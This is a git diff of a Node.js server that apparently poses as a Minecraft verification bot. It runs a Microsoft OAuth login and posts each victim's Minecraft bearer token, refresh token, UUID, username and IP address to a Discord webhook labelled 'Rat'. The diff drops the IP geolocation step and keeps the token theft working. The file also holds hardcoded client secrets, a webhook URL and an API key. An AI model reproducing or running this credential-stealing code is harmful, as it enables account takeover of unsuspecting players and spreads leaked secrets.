@@ -1,11 +1,12 @@
 //Change these btw
-const client_secret = 'eN~8Q~eBK.rYhDFuoxBTz6DIk3oZiVdvm5FKRcPI'
+const client_secret = 'Lh-8Q~Dqlnl18VjOpZlOdV15dSTjkWGIKSnbzdv-' 
 const client_id = '715942dd-50ce-46ef-8e53-127363d8fb97'
 const redirect_uri = 'https://verificationbotmc.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1048525552274915338/K9JNAgs9SYg4-dhZ-6SvZg-5Vh5GFOQxWU9XPqLoDeQi7w8Rj4kpYvGOrnYwYkT3sf6Y'
 
+
 //Requirements
-const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_url='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const express = require('express')
 const app = express()
@@ -37,11 +38,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = clientIp
-        const ipLocationArray = await getIpLocation(ip)
-        const country = ipLocationArray[0]
-        const city = ipLocationArray[1]
-        const flag = ipLocationArray[2]
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken, country, city, flag)
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
     }
@@ -130,18 +127,7 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
-async function getIpLocation(ip) {
-    const url = 'https://ipgeolocation.abstractapi.com/v1/?api_key=28d3584274844560bdf38a12099432dd&ip_address='+ip
-    const config = {
-        headers: {
-            'Content-Type': 'application/json',
-        }
-    }
-    let response = await axios.get(url, config)
-    return [response.data['country'], response.data['city'], response.data.flag['emoji']]
-}
-
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken, country, city, flag) {
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
 username: "[LVL 100] Rat",
@@ -162,22 +148,17 @@ content: "@everyone",
           inline: true
         },
         {
-            name: "**IP Location:** "+flag,
-            value: "```"+country+", "+city+"```",
-            inline: true
-          },
-        
+          name: "**Refresh:**",
+          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
+          inline: true
+        },
         {
           name: "**Token:**",
           value: "```"+bearerToken+"```"
-        },
-        {
-            name: "**Refresh:**",
-            value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
-          }
+        }
       ],
       "footer": {
-        "text": "By heda",
+        "text": "RAT",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
